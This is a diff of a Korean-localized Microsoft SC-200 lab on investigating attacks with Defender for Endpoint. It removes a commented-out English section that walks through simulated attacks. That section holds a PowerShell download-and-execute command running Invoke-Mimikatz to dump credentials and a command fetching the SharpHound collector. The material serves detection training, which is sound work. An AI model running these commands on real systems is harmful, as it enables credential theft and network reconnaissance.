@@ -45,45 +45,6 @@ lab:
 
 >**참고:** 포털의 평가 랩 및 자습서 및 시뮬레이션 섹션을 더 이상 사용할 수 없습니다. 다음 단계는 참조용으로만 제공됩니다. 시뮬레이션된 **[공격에 대한 데모는 대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 참조하세요. 시뮬레이션된 공격에 대한 대체 항목을 찾기 위해 노력하고 있습니다.
 
-<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.
-
-`Attack 1: Mimikatz - Credential Dumping`
-
-1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.
-
-1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.
-
-    ```CommandPrompt
-    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
-    ```
-
-1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.
-
-1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.
-
-`Attack 2: Bloodhound - Collection`
-
-1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.
-
-1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
-
-    ```PowerShell
-    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
-    ```
-
-    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.
-
-1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.
-
-1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
-
-    ```PowerShell
-    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
-    ```
-
-1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->
-
 1. 왼쪽 메뉴의 엔드포인트에서 **평가 및 자습서를** 선택한 **다음 왼쪽에서 자습서 및 시뮬레이션을** 선택합니다**.**
 
 1. **자습서** 탭을 선택합니다.
@@ -92,7 +53,7 @@ lab:
 
 1. 새 브라우저 탭에서 **시뮬레이션 실행**이라는 섹션(페이지 5, 2단계부터)을 찾고 단계에 따라 공격을 실행합니다. **힌트:** 시뮬레이션 파일 *RS4_WinATP-Intro-Invoice.docm*은 시뮬레이션 파일** 가져오기 단추를 선택하여 **이전 단계에서 선택한 연습** 읽기 바로 아래 **포털에서 다시 찾을 수 있습니다.
 
-<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
+    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
 
 ### 작업 3: 공격 조사
 
@@ -100,7 +61,7 @@ lab:
 
 1. "한 엔드포인트에서 검색된 여러 위협 패밀리"라는 새 인시던트가 오른쪽 창에 있습니다. 인시던트 이름을 선택하여 세부 정보를 로드합니다.
 
-    >**참고:** 경고** 창에 Bloodhound* 및 Mimikatz* 경고가 **모두 *표시됩니다. 자산/디바이스***에서 **win1* 컴퓨터는 **이제 위험 수준이** *높습니다*.
+    <!---    >**Note:** You should see both *Bloodhound* and Mimikatz* alerts in the **Alerts** pane. In **Assets/Devices**, the *win1* computer will now have a **Risk level** of *High*. --->
 
 1. **인시던트 관리** 단추를 선택하면 새 창 블레이드가 나타납니다. 
 
